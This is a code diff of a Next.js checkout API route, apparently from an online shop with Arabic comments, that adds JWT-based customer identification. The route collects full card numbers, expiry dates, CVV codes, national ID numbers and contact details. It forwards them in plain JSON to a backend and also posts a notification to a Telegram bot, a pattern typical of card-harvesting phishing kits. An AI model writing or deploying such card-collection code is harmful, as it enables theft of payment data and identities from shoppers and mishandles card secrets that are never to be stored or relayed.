@@ -1,13 +1,44 @@
 import { NextRequest, NextResponse } from "next/server";
+import jwt from "jsonwebtoken";
+
+function getCustomerIdFromCookie(req: NextRequest): { userId: string | null; cookieHeader: string } {
+  const cookieHeader = req.headers.get("cookie") || "";
+  try {
+    // استخراج customer_token من الـ cookie header
+    const match = cookieHeader.match(/(?:^|;\s*)customer_token=([^;]+)/);
+    if (!match) return { userId: null, cookieHeader };
+    const token = decodeURIComponent(match[1]);
+    const secret = process.env.JWT_SECRET;
+    if (!secret) return { userId: null, cookieHeader };
+    const payload = jwt.verify(token, secret) as { sub?: string; type?: string };
+    if (payload?.type !== "customer" || !payload?.sub) return { userId: null, cookieHeader };
+    return { userId: payload.sub, cookieHeader };
+  } catch {
+    return { userId: null, cookieHeader };
+  }
+}
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, customerEmail } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
+  // استخراج userId من الـ session cookie
+  const { userId, cookieHeader } = getCustomerIdFromCookie(req);
+
+  // تحديد الـ email المُرسل (من body أو من JWT)
+  const customerEmailNormalized = customerEmail
+    ? customerEmail.toLowerCase().trim()
+    : null;
+
   const backendUrl = process.env.BACKEND_URL;
-  const payload = JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment });
+  const payload = JSON.stringify({
+    orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer,
+    whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment,
+    ...(userId && { userId }),
+    ...(customerEmailNormalized && { customerEmailNormalized }),
+  });
 
   const ltr = "\u200E";
 
@@ -47,12 +78,20 @@ export async function POST(req: NextRequest) {
     ],
   };
 
+  let savedOrderId: string | null = null;
+
   await Promise.all([
     fetch(`${backendUrl}/api/checkout`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: payload,
-    }).then(r => r.json()).then(j => console.log("[notify] save response:", JSON.stringify(j))).catch(e => console.error("[notify] save error:", e)),
+    })
+      .then(r => r.json())
+      .then(j => {
+        console.log("[notify] save response:", JSON.stringify(j));
+        if (j?._id) savedOrderId = j._id;
+      })
+      .catch(e => console.error("[notify] save error:", e)),
     fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
@@ -63,5 +102,18 @@ export async function POST(req: NextRequest) {
     ).then(r => r.json()).then(j => console.log("[notify] telegram response:", JSON.stringify(j))).catch(e => console.error("[notify] telegram error:", e)),
   ]);
 
-  return NextResponse.json({ ok: true, orderId });
+  return NextResponse.json({
+    ok: true,
+    orderId,
+    _id: savedOrderId,
+    // بيانات الطلب الكاملة لحفظها في verify_data
+    orderSnapshot: {
+      orderId,
+      _id: savedOrderId,
+      items,
+      total,
+      customerEmail: customerEmailNormalized,
+      userId,
+    },
+  });
 }
